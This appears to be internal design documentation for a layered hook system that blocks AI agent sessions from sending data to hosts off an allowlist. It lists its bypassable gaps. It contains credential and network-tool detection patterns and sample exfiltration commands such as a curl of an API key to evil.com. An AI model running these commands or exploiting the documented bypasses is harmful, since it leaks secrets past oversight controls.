---
element: egress-allowlist-wall
title: "egress-allowlist-wall — element detail (ground/base altitude)"
subsystem: security
altitude: base
record_type: organism-element
maturity_label: LIVE·gap
gap_disposition: defect
gap_disposition_note: "ruled 2026-07-28 at class level — C2 exception — SAFE_FETCH_ALLOWLIST per-run seal is armed by NO caller; scoping pass required before arming (premortem). ⚠ CORRECTED 2026-08-15 — the premise of that ruling no longer holds. The seal was BUILT OUT into a switchable Level-2 wall with a persistent switch file, three named states, and a test suite. It still SHIPS OFF, so by default nothing is sealed; what changed is that the state is now knowable and a half-configured list REFUSES instead of passing. The residual gap is that no caller arms it, not that it cannot be armed. See the CORRECTION banner below."
generated_from:
  - system/hooks/guard_egress.sh
  - system/hooks/enforce_egress_allowlist.sh
  - system/hooks/enforce_egress_allowlist.py
  - system/hooks/ingest_gate_enforce.sh
  - system/egress-allowlist.md
  - system/egress-allowlist.hosts
  - system/tools/safe_fetch.py
  - system/tools/safe_search_api.sh
  - system/reference/settings.json
created_at: 2026-07-23
updated_at: 2026-07-23
status: active
authority: user
---

# egress-allowlist-wall — element detail

> **LADDER: ELEMENT (full mechanics). up → manual#egress-allowlist-wall ; ground truth → the live artifacts (generated_from)**
>
> **Altitude = BASE (ground / street view).** The in-the-weeds detail of the outbound exfiltration wall.
> The MIDDLE manual (`system/organism/manual.md`) carries only a one-line pointer here; the TIP
> (`CLAUDE.md` schematic) shows only its box + arrows.
>
> **One-line:** block every outbound network call that targets a host not explicitly on the allowlist —
> so a hijacked or hallucinating session cannot exfiltrate data to an arbitrary endpoint.
>
> **Step grammar:** `actor → port/tool → store → gate`
> Enforcement tags: `[hook]` (a real guard fires) · `[skill]` (skill logic / mandatory script) ·
> `[honor]` (prose instruction only, no mechanical enforcement) · `[human]` (deliberate HITL pause).

> **CITATIONS — what the paths below resolve to here.** The body describes the donor system truthfully, including its honest UNBUILT admissions; the three lines below record what happened to each named file at THIS destination, and they cover every mention of them in the body.
>
> ⏳ unruled — `system/egress-allowlist.hosts`, the OS-firewall companion list. It did not come over, and the canonical
> allowlist that DID come over (`system/egress-allowlist.md`) makes no mention of a hosts file. Nothing automated ever read it — the body says so at the OS-layer-backstop section: *"The OS firewall does NOT literally read `egress-allowlist.hosts`."* Whether an OS-layer backstop gets armed here at all is an OPEN human decision, and no phase owes this file. A DEBT, not a pass — ~~the same class as the `SAFE_FETCH_ALLOWLIST` per-run seal the body correctly labels HONOR-SYSTEM / UNBUILT~~ ⚠ CORRECTED 2026-08-15: that comparison no longer holds. The per-run seal was built out and made switchable today (see the CORRECTION banner immediately below); this hosts-file debt now stands on its own. The disposition on this line is unchanged by that — the OS-layer backstop is still an open human decision.
>
> ⛔ `system/reference/settings.json` — does not ship: the donor kept a git-tracked reference COPY there because its real settings lived outside the repo. Here the real, git-tracked settings file is `.claude/settings.json`, which is where this wall's PreToolUse registrations actually live. Recorded independently in `system/tools/organism/label_checker.py` lines 28-36.
>
> ⛔ `state/status/sentinel.json` — runtime-generated, created on first run, never committed. It is a status tile the reader's own run writes under their notes/data root (`shared/gate/sentinel_response.py` line 53 resolves it as `{DATA}/state/status/sentinel.json`); the writers `system/tools/sentinel-health.py` and `system/tools/sentinel-health-run.sh` DO ship. Absent from a fresh checkout is CORRECT.

> **⚠ CORRECTION — 2026-08-15 — the in-process domain seal was ARMED. It still ships OFF.**
> Everything below that calls the `SAFE_FETCH_ALLOWLIST` per-run seal UNBUILT, HONOR-SYSTEM, "not armed",
> "never armed by any caller", or "task #17 — a planned feature, not a live one" **was true when this element
> was authored on 2026-07-23 and is false as of today.** Each site is struck and dated in place; this banner is
> the one full statement. Enver ruled it (`authority: user`: *"APPROVED — ARM IT"*), against a shape that had
> already been ruled — three honest levels, default off, activatable.
>
> **What actually shipped, verified this session.** A persistent switch file, `system/safe-fetch-allowlist.md`,
> using the same ALLOWLIST-START / ALLOWLIST-END marker convention as `system/egress-allowlist.md` so the two
> lists parse alike. Inside `system/tools/safe_fetch.py`, a new `l2_state()` resolves every read to exactly
> **three named outcomes and no quiet fourth**: **OFF** — allowed, and it *announces on stderr, once per
> process,* that the seal is not in force; **ON** — enforced, an off-list host refused **before the socket
> opens**; **AMBIGUOUS** — **refused**. Precedence is explicit: the `SAFE_FETCH_ALLOWLIST` env var is the
> **per-run** seal and outranks the file, while the file is the **persistent** switch a human sets by hand. A
> new `--l2-status` flag reports the switch position without fetching anything.
> `system/tools/test_egress_level2.py` holds 12 tests and is picked up and passing inside the aggregate gate
> `system/tools/run-all-tests.sh`.
>
> ⛔ **DO NOT READ THIS AS "THE EGRESS WALL IS NOW ENFORCED."** It ships `off` with an empty domain block, and
> `--l2-status` printed, this session: *"L2 egress allowlist: OFF — web reads are not sealed to a domain
> list."* **By default it seals nothing.** The honest claim is **armed and switchable, ships OFF, and refuses
> loudly when half-configured** — five ambiguous states now REFUSE rather than pass, including the believable
> human error of *domains listed while the switch still reads `off`*. What changed is that the level you are
> actually at is now knowable and stated out loud; not that a wall went up.
>
> ⚠ **Two things did NOT change.** (1) The Bash-command domain hook still **fails OPEN, deliberately**, and the
> asymmetry now has a stated reason: that hook sits in front of *every* Bash command, where a false positive
> stops ordinary work and somebody unregisters the guard; the new in-process seal sits in front of web reads
> only and is off unless deliberately armed. (2) **The OS firewall (LuLu) remains the only HARD wall of the
> three, and it is still not included here.**
>
> ⚠ **A NUMBERING COLLISION — read the body below with this in hand.** This element numbers its layers
> **L1 = `guard_egress.sh`** (credential-exfil) · **L2 = `enforce_egress_allowlist.sh`** (the Bash-command
> domain hook) · **L3 = `ingest_gate_enforce.sh`** (raw WebFetch/WebSearch deny). The newly shipped code and
> `docs/OUTSIDE-SERVICES.md` number a *different* ladder: **Level 1 = the Bash-command domain hook** (this
> element's L2) · **Level 2 = the in-process `safe_fetch.py` seal** (what this element calls its "in-process
> fourth mechanism") · **Level 3 = the OS firewall**. Wherever a correction below says **"Level 2"** it means
> **the in-process `safe_fetch.py` seal**. Neither numbering is wrong; they count different things.

---

## AUTHORED   (human-only)

### ARCHITECTURE OVERVIEW

The wall is built from **three independent, layered mechanisms** — each fires independently; a call must
pass all layers that apply to it. No single mechanism is the sole line of defence.

| Layer | File | Hook registration | Fail posture |
|---|---|---|---|
| L1 — credential-exfil guard | `guard_egress.sh` | PreToolUse Bash | OPEN (unparseable input → exit 0) |
| L2 — name allowlist | `enforce_egress_allowlist.sh` + `.py` | PreToolUse Bash | OPEN on two edge conditions (see below) |
| L3 — blanket raw-tool block | `ingest_gate_enforce.sh` | PreToolUse WebFetch · WebSearch | CLOSED (unconditional deny) |
| OS — host firewall | `egress-allowlist.hosts` (reference; manual per-app/domain rules in the firewall — does NOT read the file directly) | OS-layer — primary machine: VERIFIED; second machine: EXPECTED·UNVERIFIED | REAL when configured; HONOR-SYSTEM for sync; primary machine currently INTERACTIVE mode (not silent-deny Passive) — see [LULU-SILENT] |

An in-process fourth mechanism — per-run domain sealing via `SAFE_FETCH_ALLOWLIST` env var in
`safe_fetch.py` — ~~exists in code but is not armed (see "HONOR-SYSTEM / GAPS" below).~~
⚠ **CORRECTED 2026-08-15** — it is now armed and switchable, and it ships **OFF**. The env var survives as the
**per-run** seal; a persistent switch file, `system/safe-fetch-allowlist.md`, was added beside it, and
`l2_state()` resolves the mechanism to OFF / ON / AMBIGUOUS with no quiet fourth state. Its fail posture is
the inverse of L1 and L2 above: **CLOSED when ambiguous** — half-configured refuses. Shipped `off` with an
empty domain block, so **it seals nothing until a human turns it on**; when off it says so on every read.
`--l2-status` reports which way it is set. See the CORRECTION banner at the top of this file.

---

### TRIGGERS AND MODE

The wall is **always-on** — no opt-in, no bypass flag (the `LIFEHACK_SKIP_*` bypass that `ingest_gate_enforce.sh`
blocks is specifically for the ingest-gate read side; no equivalent skip exists for egress). It fires on
every relevant PreToolUse event with no SessionStart or PostToolUse component.

Triggering events:
- **Any Bash tool call** — both L1 and L2 inspect the command string on every Bash call. They short-circuit
  immediately if no outbound mechanism keyword is present in the command, so benign calls pay only a regex
  scan overhead.
- **Any WebFetch call** — L3 (`ingest_gate_enforce.sh`) hard-denies unconditionally.
- **Any WebSearch call** — L3 hard-denies unconditionally.
- **Read / Write / Edit calls** — no egress hook fires on these; file reads and writes are outside scope.

---

### HAND-OFF CHAIN

#### L1 — Credential-exfil guard (`guard_egress.sh`)

`PreToolUse(Bash) → guard_egress.sh (reads stdin JSON) → parses tool_input.command → two-regex AND gate → exit 2 | exit 0 [hook]`

1. Parse the PreToolUse JSON from stdin; extract `tool_input.command`. Unparseable input → exit 0 (fail-open).
2. **Mechanism check (regex OR):** does the command contain any of: `curl`, `wget`, `nc`, `ncat`, `netcat`,
   `telnet`, `urllib.request`, `urllib.urlopen`, `requests.(get|post|put|patch|delete|request)`,
   `httpx.`, `http.client`, `socket.(socket|create_connection)`? If NO outbound mechanism → exit 0 (pass).
3. **Credential check (regex OR):** does the command string contain a raw credential literal — any of:
   `sk-ant-`, `sk_live_`, `sk-[A-Za-z0-9]{20,}`, `AKIA[0-9A-Z]{16}`, `ghp_[A-Za-z0-9]{30,}`,
   `xox[bporsa]-`, `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `AWS_SECRET_ACCESS_KEY`?
   If NO credential pattern → exit 0 (pass). A clean `curl` with no literal key is NOT blocked.
4. **BOTH match** (outbound mechanism + credential literal in the SAME command) → stderr message + `exit 2` —
   the Bash call is blocked before it runs. `[hook]`

**AND-gate semantics:** a mechanism alone is fine; a credential literal alone is not blocked. Only the
combination is denied. This is a targeted credential-exfiltration guard, not a general outbound block.

**Critical gap:** the regex scans the raw command TEXT as delivered to the hook. Credentials passed by
env-var reference (e.g., `curl -H "Authorization: Bearer $MY_KEY"` where `MY_KEY` is set in the
environment) will NOT match — the expansion happens in the shell after the hook fires, and the hook sees only
the literal string `$MY_KEY`, not the key value. This is a documented, structural limitation of the PreToolUse
scanning approach; L2 and the OS firewall are the backstop for exfiltration of env-held credentials.

---

#### L2 — Name-allowlist wall (`enforce_egress_allowlist.sh` / `.py`)

`PreToolUse(Bash) → enforce_egress_allowlist.sh → enforce_egress_allowlist.py → parses command → extracts hosts → checks egress-allowlist.md → sentinel log on block → exit 2 | exit 0 [hook]`

1. Shell wrapper sets `ALLOWLIST_FILE=$HOME/lifehack-brain/system/egress-allowlist.md` and
   `exec python3 enforce_egress_allowlist.py`. Python reads stdin JSON.
2. Parse `tool_input.command`. If unparseable → exit 0 (fail-open, with stderr note).
3. **Mechanism check:** same MECH regex as L1. If no outbound mechanism in command → exit 0 immediately (pass).
4. **Host extraction:** extract candidate hostnames from `https?://` URL patterns + bare `nc`/`telnet`
   host arguments in the command. If no host can be extracted (dynamic URL construction from variables,
   string concatenation, IP-literal) → exit 0 **FAIL-OPEN** with a stderr note. The OS firewall is the declared
   backstop for this gap.
5. **Allowlist load:** read `egress-allowlist.md` between `ALLOWLIST-START` / `ALLOWLIST-END` markers.
   If file unreadable or marker section empty → exit 0 **FAIL-OPEN** with stderr note.
6. **Domain check:** for each extracted host, check: `host == domain` OR `host.endswith("." + domain)` for
   every domain in the allowlist. Subdomain matching is permissive within a listed base domain.
7. **Any host NOT on allowlist** → stderr block message + `_sentinel_log_block()` (best-effort append to
   `$DRIVE/system/logs/sentinel-events.jsonl`) + `exit 2`. The sentinel log call never raises — a logging
   failure does not affect the block decision. `[hook]`

**Current allowlist (from `egress-allowlist.md` between markers, 2026-07-23):**

| Domain | Purpose |
|---|---|
| `googleapis.com` | Google APIs (gws CLI calls) |
| `google.com` | Google services |
| `gstatic.com` | Google static assets |
| `googleusercontent.com` | Google user content |
| `serper.dev` | Serper search API (`safe_search_api.sh`) |
| `ntfy.sh` | Sentinel push notifications (notify-plane) |
| `<your-supabase-host>` | Emily desk's Supabase project (host-locked — NOT `*.supabase.co`) |
| `github.com` | Git clone / push / pull |
| `githubusercontent.com` | Raw GitHub content |
| `anthropic.com` | Model API |

The Supabase entry is intentionally host-locked to the single project URL — the wildcard `*.supabase.co`
would allow any Supabase project, which is not the intent. This is a documented security decision.

**Scope gap:** L2 fires ONLY on the Bash tool. Edit/Write/Read tool matchers do NOT have this hook.
The wall applies only to tool calls that go through the Bash channel.

---

#### L3 — Blanket raw-tool block (`ingest_gate_enforce.sh`)

`PreToolUse(WebFetch | WebSearch) → ingest_gate_enforce.sh → unconditional deny → exit 2 [hook]`

`ingest_gate_enforce.sh` is registered for four matchers in `settings.json`. For egress purposes:

- **matcher=WebFetch** → deny unconditionally. No allowlist check, no bypass path. WebFetch is blocked
  entirely; `safe_fetch.py` (invoked via Bash) is the only sanctioned replacement.
- **matcher=WebSearch** → deny unconditionally. No bypass path; `safe_search_api.sh` (invoked via Bash) is
  the only sanctioned replacement.
- **matcher=Bash** → applies the ingest-gate's inbound-read-security checks (email-body guard, calendar
  guard, scratch-dir lock, item-store guard, etc.). From an egress perspective the most relevant control
  in this case is sub-check **(a)**: any Bash command that sets a `LIFEHACK_SKIP_*` bypass variable is
  denied unconditionally. Because `LIFEHACK_SKIP_*` vars would disable the sanitizer layer, blocking their
  assignment is itself an egress-relevant control — it prevents a hijacked session from disabling `safe_fetch.py`
  or `safe_search_api.sh`'s sanitizer gates and routing content out through an un-scrubbed path. The
  Bash matcher's other sub-checks (scratch-dir lock, email-store guard, etc.) are inbound-gate controls
  owned by the `security-ingest-gate` element and are not catalogued here.
- **matcher=Read** → applies inbound file-type and trusted-zone checks (owned by `security-ingest-gate`);
  no direct egress relevance.

Both WebFetch and WebSearch denies fire before any network connection opens. No content leaves the system
via these native tool calls; the only egress path is through `safe_fetch.py` or `safe_search_api.sh`, both
of which are themselves gated by L1 + L2 on their Bash invocations.

These deny rules also serve the ingest-gate element's inbound-read-security purpose (see INTEROP SEAMS) —
the two security functions share one hook file, which is why the element files cross-reference each other.

---

#### OS-layer backstop (LuLu)

`egress-allowlist.hosts` (reference list) · your OS firewall (Little Snitch / LuLu / `ufw` / etc.) → manual per-app/domain rules → net-layer enforcement

`system/egress-allowlist.hosts` contains the same ten base domains as `egress-allowlist.md`, formatted as a
reference companion for firewall configuration. **The OS firewall does NOT literally read `egress-allowlist.hosts`** — it
enforces via manually configured per-app/domain rules in its own rule store. The hosts file is a human-readable
reference used when manually entering or auditing those rules; there is no automated import. **Primary machine:
VERIFIED** — the firewall is installed and running this session (its rule store is present). **Second machine:
EXPECTED but UNVERIFIED** — not reachable this session; assume present, not confirmed. When configured, it
provides a genuine OS-layer fallback for:
- **Dynamic URL construction** (L2's fail-open gap when no host can be extracted from the command string).
- **IP-literal calls** (bypassing domain-name resolution entirely).
- **Env-var credential exfiltration** (L1's gap for credentials not in the literal command string).
- **Any future Bash pattern the regex doesn't match.**

The firewall's enforcement is real and always-on for configured machines. Its weakness is **manual rule management**:
no automation in the codebase propagates changes from `egress-allowlist.md` into the firewall's per-app/domain rule
store on any machine (it does not read `egress-allowlist.hosts` directly — the file is a human reference
only). A new domain added to `egress-allowlist.md` and committed to git will NOT automatically appear in
the firewall's rules until a human manually updates them. Similarly, a domain removed from the allowlist will continue
to be permitted at the OS layer until manually corrected there.

**Known operational state — [LULU-SILENT] (debt-ledger, state:blocked):** the firewall on the primary machine is
currently running in **INTERACTIVE mode**, not the intended silent-deny-by-default **Passive mode**. In
INTERACTIVE mode, it prompts the user on each new connection instead of silently denying unlisted hosts.
This means the OS-layer backstop there does not provide the passive silent-deny enforcement described
above; it operates as an alert-and-confirm layer instead. The second machine's firewall mode is not separately
confirmed. Until this is resolved, the primary machine's OS-layer backstop should be treated as DEGRADED for
the dynamic-URL and IP-literal fail-open cases it is meant to cover.

---

### THE SANCTIONED FETCH PLANE (the clean door through the wall)

The wall is a DENY wall for raw tools. The system's two permitted outbound fetch paths are `safe_fetch.py`
and `safe_search_api.sh` — both invoked via Bash, both gated by L1 + L2.

#### `safe_fetch.py`

`agent/skill → Bash: python3 .../safe_fetch.py '<URL>' → L1 (guard_egress.sh) → L2 (enforce_egress_allowlist.sh) → safe_fetch.py in-process allowlist check → urllib.request (stdlib) → sanitize → output [hook + honor]`

1. Agent or skill invokes `safe_fetch.py` via Bash.
2. The Bash call hits `guard_egress.sh` (L1): `urllib.request` is in the mechanism list. A clean invocation
   with no credential literal in the command string → exit 0 (pass). L1 does not block a normal safe_fetch call.
3. The Bash call hits `enforce_egress_allowlist.sh` (L2): extracts the host from the URL argument → checks
   against `egress-allowlist.md` → blocks if not listed. A call to a non-allowlisted domain is blocked
   BEFORE `safe_fetch.py` runs. `[hook]`
4. Inside `safe_fetch.py`, `_enforce_egress_allowlist()` is called at line ~150, BEFORE the socket opens.
   It applies two sub-steps in order:

   **4a. Scheme block (unconditional, always-on SSRF guard):** parses the URL scheme; if the scheme is NOT
   `http` or `https`, raises `RuntimeError` immediately — `file://`, `ftp://`, `gopher://`, and any other
   non-web scheme are hard-blocked. This fires regardless of whether `SAFE_FETCH_ALLOWLIST` is set, making
   it an always-on in-process SSRF guard that predates and is independent of the env-var allowlist.

   **4b. Per-run allowlist seal (conditional):** checks the `SAFE_FETCH_ALLOWLIST` env var: if set
   (comma-separated domain list), it rejects any host not in that per-run list (a task-scoped seal).
   ~~If unset → no per-run restriction; falls through to the outer hook check from step 3.~~
   ⚠ **CORRECTED 2026-08-15** — the unset branch is no longer a silent fall-through. `l2_state()` now
   consults the persistent switch file `system/safe-fetch-allowlist.md` and returns one of three named
   outcomes. **OFF** (the shipped state, and what the file says today) → the read is allowed *and* one line on
   stderr says the seal is not in force, so the caller is never left assuming a wall. **ON** → an off-list host
   raises before the socket opens. **AMBIGUOUS** → the read is **REFUSED**, naming the file and the fix. The
   env var still wins when set — it is the per-run seal, the file is the persistent one.
5. `safe_fetch.py` fetches the URL using `urllib.request` (Python stdlib), not `requests` or `httpx` — the
   stdlib call is already in L1's mechanism list and gets correctly gated.
6. HTML is stripped (`_TextExtractor` skips `<script>`, `<style>`, `<nav>`, hidden elements). `sanitize()`
   applies L0 injection-scan pass — **always called, not optional** (safe_fetch.py line ~180: `clean = sanitize(visible_text, max_len=NO_CAP)` is unconditional). Post-sanitize optional steps: `scan_for_injection()` heuristic (guarded by `if scan_for_injection is not None`); `provenance_route()` tagging — both optional.

~~**`SAFE_FETCH_ALLOWLIST` status (HONOR-SYSTEM / UNBUILT):** The per-run sealing env var exists in the code
(checked at `safe_fetch.py` line ~134). However, NO caller in the codebase sets or exports `SAFE_FETCH_ALLOWLIST`.
It is documented in `egress-allowlist.md` as "task #17" — a planned feature, not a live one. Per-run domain
sealing via this mechanism is NOT active; any URL whose domain is in `egress-allowlist.md` is reachable by
any `safe_fetch.py` call regardless of calling context. The L2 hook (step 3) is the only active domain gate.~~

⚠ **CORRECTED 2026-08-15 — `SAFE_FETCH_ALLOWLIST` status: BUILT, SWITCHABLE, SHIPS OFF (no longer
HONOR-SYSTEM / UNBUILT).** The paragraph above is the 2026-07-23 record and is kept because it is what was
true then. What is true now, verified this session:

- **It is no longer env-var-only.** A persistent switch file, `system/safe-fetch-allowlist.md`, carries a
  one-word `on`/`off` switch plus a domain block, using the same marker convention as `system/egress-allowlist.md`.
- **Three named outcomes, no quiet fourth.** `l2_state()` in `system/tools/safe_fetch.py` returns **OFF**
  (allowed, and announced on stderr once per process), **ON** (enforced — an off-list host is refused before
  the socket opens), or raises **AMBIGUOUS** (**refused**). Five distinct half-configured states refuse,
  including *domains listed while the switch still reads `off`* — the believable human error.
- **Precedence is stated.** The `SAFE_FETCH_ALLOWLIST` env var is a **per-run** seal and **outranks** the
  file; an empty value counts as unset and falls through. The file is the **persistent** switch.
- **It is checkable without fetching:** `python3 system/tools/safe_fetch.py --l2-status`.
- **12 tests** in `system/tools/test_egress_level2.py`, picked up and passing inside `system/tools/run-all-tests.sh`.

⛔ **What is still TRUE from the struck paragraph, and must not be lost:** it **ships OFF** with an empty
domain block, and **no caller in the codebase sets `SAFE_FETCH_ALLOWLIST`.** So in the default checkout this
mechanism seals nothing, and the Bash-command hook at step 3 remains the only *active* domain gate. The gap
moved from *"cannot be armed"* to *"is not armed by default, and says so out loud on every read."* That is a
real improvement in honesty and in reach, and it is **not** the same thing as the wall being enforced.

#### `safe_search_api.sh`

`agent/skill → Bash: safe_search_api.sh '<query>' → L1 (guard_egress.sh) → L2 (enforce_egress_allowlist.sh) → safe_search_api.sh → https://google.serper.dev/search → sanitize → output [hook]`

1. Hard-codes exactly ONE outbound host: `https://google.serper.dev/search` (lines 88–93). Callers cannot
   redirect it to an arbitrary endpoint.
2. API key is read from macOS keychain via `security find-generic-password` — never echoed, never printed.
   It is passed to an inline `python3` heredoc via environment variable `SERPER_KEY` — **NOT** on `argv` and
   **NOT** in the command string. L1's credential regex matches literal key patterns in the command text; an
   env-var-passed key will NOT trigger L1. (This is correct behavior — the key is not being exfiltrated.)
3. `serper.dev` is on the allowlist → L2 passes the call.
4. Daily call cap: `/tmp/serper_calls_YYYYMMDD.log` tracks the count; default `MAX=500`; exit 2 on breach.
   The cap is overridable: if the `SERPER_MAX_DAILY` env var is set by the caller, `MAX` is read from it
   instead of the default 500 — a caller can raise or eliminate the cap entirely. No hook guards this
   override; it is an honor-system control (a runaway loop could set `SERPER_MAX_DAILY=99999`).
5. Optional `--tbs <value>` flag (e.g. `--tbs qdr:w` for past-week results): parsed by the shell before
   the API call and forwarded as the Serper `tbs` field in the JSON payload, which narrows results to the
   specified time window. When omitted, the call is made without a time filter (default Serper behavior).
   This is a documented optional parameter affecting the search call scope, not a security control.
6. Response is piped through `safe_input.py` L0 scan + heuristic injection check before reaching the model.

---

### PORTS TOUCHED

**Read (hook input):**
- `system/egress-allowlist.md` — canonical allowlist (authoritative source for L2's domain set; read on
  every triggering Bash call)
- PreToolUse stdin JSON (tool_input.command) — for both guard_egress.sh and enforce_egress_allowlist.py

**Read (operational):**
- `system/egress-allowlist.hosts` — firewall companion file (read only by human when syncing firewall rules)
- `/tmp/serper_calls_YYYYMMDD.log` — daily call counter (read + written by `safe_search_api.sh`)

**Written on block event:**
- `$DRIVE/system/logs/sentinel-events.jsonl` — L2 appends a `{"source":"hook/egress","verdict":"blocked",...}`
  JSON record on every off-allowlist denial (best-effort; logging failure does not affect the block)

**No Write/Edit/Read tool matchers registered** for this element — the wall operates entirely on the Bash
and WebFetch/WebSearch tool channels.

---

### OUTCOME

Every raw outbound network call from the system is either:
- **Blocked at L3** (WebFetch/WebSearch — unconditional deny, no path through)
- **Gated at L2** (Bash with an extractable URL host — domain-checked against `egress-allowlist.md`)
- **Gated at L1** (Bash with credential literal + outbound mechanism — credential-exfil deny)
- **Passed to the OS layer** (dynamic URL, IP-literal, or env-var credential — OS-firewall backstop when synced)

Data cannot leave the system to an arbitrary endpoint via the covered tool channels. An endpoint must be
explicitly added to `egress-allowlist.md` (and the firewall synced) before any tool call can reach it.

---

### GENERATED_FROM

`system/hooks/guard_egress.sh` · `system/hooks/enforce_egress_allowlist.sh` · `system/hooks/enforce_egress_allowlist.py` · `system/hooks/ingest_gate_enforce.sh` (WebFetch/WebSearch matchers) · `system/egress-allowlist.md` (canonical allowlist) · `system/egress-allowlist.hosts` (firewall companion) · `system/tools/safe_fetch.py` · `system/tools/safe_search_api.sh` · `system/reference/settings.json` (PreToolUse registrations).

---

### ENFORCEMENT POINTS (the honest map)

**REAL + FIRE-TESTABLE:**

1. **`guard_egress.sh`** (PreToolUse Bash) `[hook]` — credential-exfil AND gate. Registered in `settings.json`;
   exit 2 blocks Bash before it runs. Concrete test: `curl https://evil.com -d $ANTHROPIC_API_KEY` (mechanism
   + literal key pattern) → blocked. `curl https://evil.com` (no credential) → passes L1 (L2 may still block).

2. **`enforce_egress_allowlist.sh`/`.py`** (PreToolUse Bash) `[hook]` — name-allowlist check. Registered in
   `settings.json`; exit 2 blocks Bash before it runs. Allowlist file confirmed present and parseable.
   Sentinel log file (`sentinel-events.jsonl`) confirmed to exist. Fire-testable with explicit URL calls to
   non-listed domains.

3. **`ingest_gate_enforce.sh` on WebFetch** (PreToolUse WebFetch) `[hook]` — unconditional deny. Registered.
   No bypass path exists. Fire-testable: any WebFetch call → blocked.

4. **`ingest_gate_enforce.sh` on WebSearch** (PreToolUse WebSearch) `[hook]` — unconditional deny. Registered.
   Fire-testable: any WebSearch call → blocked.

5. **`safe_search_api.sh` host-lock** `[skill]` — hardcodes `https://google.serper.dev/search`; callers
   cannot pass an arbitrary URL; key passed via env var, never in command string. Structurally correct.

**HONOR-SYSTEM / GAPS (documented, not silently glossed):**

1. ~~**`SAFE_FETCH_ALLOWLIST` per-run sealing** `[honor]` — the in-process per-run domain seal inside
   `safe_fetch.py` exists in code but is never armed by any caller. Documented as "task #17" in
   `egress-allowlist.md`. A call to `safe_fetch.py` with any allowlisted domain is unrestricted by context.~~
   ⚠ **CORRECTED 2026-08-15 — this is no longer `[honor]`.** The seal became a real, switchable mechanism
   with a persistent switch file and a test suite; when armed it is `[skill]`-grade enforcement that refuses
   before the socket opens, and when half-configured it refuses outright. **The residual gap is narrower but
   real:** it **ships OFF** and no caller sets the env var, so by default a `safe_fetch.py` call is still
   unrestricted by context — the difference is that it now *announces* that on every unsealed read instead of
   passing silently. Restated honestly: **armed and switchable, ships OFF, refuses loudly when half-configured.**

2. **Firewall rules are manually maintained** `[honor]` — the OS firewall does NOT read `egress-allowlist.hosts` directly;
   it enforces its own manually configured per-app/domain rule store. `egress-allowlist.hosts` is a human
   reference only. No automation propagates `egress-allowlist.md` changes into the firewall's rules. Until a human
   manually updates those rules on each machine, the OS-layer net diverges from the hook-layer allowlist.
   Primary machine: VERIFIED running. Second machine: EXPECTED but UNVERIFIED this session. No sync-check hook exists.

3. **L2 fail-open on dynamic URLs** `[honor / design]` — if a command constructs a URL via string
   concatenation, variable expansion, or uses an IP literal, L2's static regex extraction cannot recover
   the target host and exits 0. The OS firewall is the backstop; when it is not synced (gap #2), this is unguarded.

4. **L1 fail-open on env-var credentials** `[honor / design]` — `guard_egress.sh` scans the raw command
   text for literal key patterns. A credential stored in an env var and passed by reference (e.g.,
   `curl -d $SECRET`) will not match; the hook sees `$SECRET`, not the key value. L2 still gates the
   target domain; the OS firewall is the net-layer backstop.

5. **Bash-tool scope only for L1+L2** `[design]` — Write, Edit, and Read matchers do NOT have egress hooks.
   File writes to a mounted remote path (e.g., Drive) are not in-scope for this wall; those are governed
   by `guard_write_paths.sh` (the residency wall, owned by the write-guard element).

---

### INTENT / CURRENT-VS-TARGET

**Intent:** prevent a compromised or hallucinating session from calling out to an arbitrary internet endpoint
to receive instructions or exfiltrate data. Pairs with `security-ingest-gate` (inbound) to close both
directions of the adversarial channel.

**Current → LIVE for the core paths.** The hook registration, the allowlist file, and the sentinel log
are all in place and fire-testable. The three most dangerous vectors — raw WebFetch/WebSearch (L3 block),
explicit curl/wget to a non-listed domain (L2 block), and credential literal in a Bash command (L1 block) —
are all mechanically enforced and can be fire-tested with synthetic probes. `health_invariants.py` names
`guard_egress.sh` as a CRITICAL hook; its absence triggers a system-health failure, wiring this element
into the system's liveness monitoring.

**Honest LIVE·gap qualification:** the label holds because the core enforcement path (named URL + Bash +
registered hooks) is real and fire-tested. The label-checker (`conformance-lab`) fire-tests both
`guard_egress.sh` and `enforce_egress_allowlist.sh` with synthetic probes.

**Debt-ledger reconciliation — [EGRESS-WALL-FAILOPEN] (state:actionable, 2026-07-23):** that entry
prescribes the label should be PARTIAL ("the map only DOCUMENTS the gap"). Resolution: LIVE·gap is adopted
instead of PARTIAL. Rationale: the primary named-URL enforcement vector (L2 allowlist check on explicit `curl`/`wget`
calls + L3 WebFetch/WebSearch unconditional deny) is mechanically enforced and fire-tested — the LIVE tier is
not overclaiming on that vector. The ·gap suffix captures the documented fail-open conditions (L2 dynamic-URL
bypass, L1 env-var credential bypass, ~~unarmed `SAFE_FETCH_ALLOWLIST`~~, manual firewall sync) without demoting
the entire label. PARTIAL would imply the hooks are honor-system; they are not.

⚠ **CORRECTED 2026-08-15** — one of the four fail-open conditions in that list changed character.
`SAFE_FETCH_ALLOWLIST` is no longer *unarmed* in the sense meant above (unbuildable, honor-only): it is now a
built, switchable, tested mechanism that **ships OFF**. It belongs in the ·gap list as **"the in-process seal
ships OFF and no caller arms it"** — a default-off gap, not an absent-mechanism gap. The other three
conditions are unchanged and still stand. The `LIVE·gap` label itself is unaffected, and the `[EGRESS-WALL-FAILOPEN]`
debt entry stays `state:actionable` — its scope narrows to *arming*, not *building*.

**Remaining TARGET items:**

1. **Arm `SAFE_FETCH_ALLOWLIST`** — instrument callers (skills, agents, research fan-outs) to set the
   env var with a task-scoped domain list before invoking `safe_fetch.py`. This closes the gap where any
   research task can reach any allowlisted domain regardless of its declared purpose. Tracked as task #17
   in `egress-allowlist.md`.
   **✔ DONE IN PART — 2026-08-15.** The *mechanism* half of this item shipped: the seal is built, switchable
   from a persistent file, three-state, `--l2-status`-checkable, and covered by 12 tests. The env var was kept
   as the per-run seal and given documented precedence over the file, which is exactly the hook this item
   wanted for a task-scoped fan-out. **The caller-instrumentation half named in this line is NOT done** — no
   skill, agent or research fan-out sets the variable yet, and the switch ships `off`. So the sentence "any
   research task can reach any allowlisted domain regardless of its declared purpose" is **still true today**;
   it is now a default-off setting rather than a missing capability. Keep this item open for the arming pass.

2. **Automate firewall rule updates** — a git post-commit hook or a scheduler watcher that prompts or scripts
   updating the firewall's per-app/domain rules on both machines whenever `egress-allowlist.hosts` changes. Until
   then, a human must manually update those rules after every allowlist edit, and the OS-layer backstop
   can silently diverge. Primary machine: VERIFIED running; second machine: EXPECTED·UNVERIFIED.

3. **Fill the dynamic-URL gap** — extend L2's host extraction to handle simple variable-expansion patterns
   (e.g., resolve `$KNOWN_VAR` if the value is statically determinable), or add a secondary hostname-log
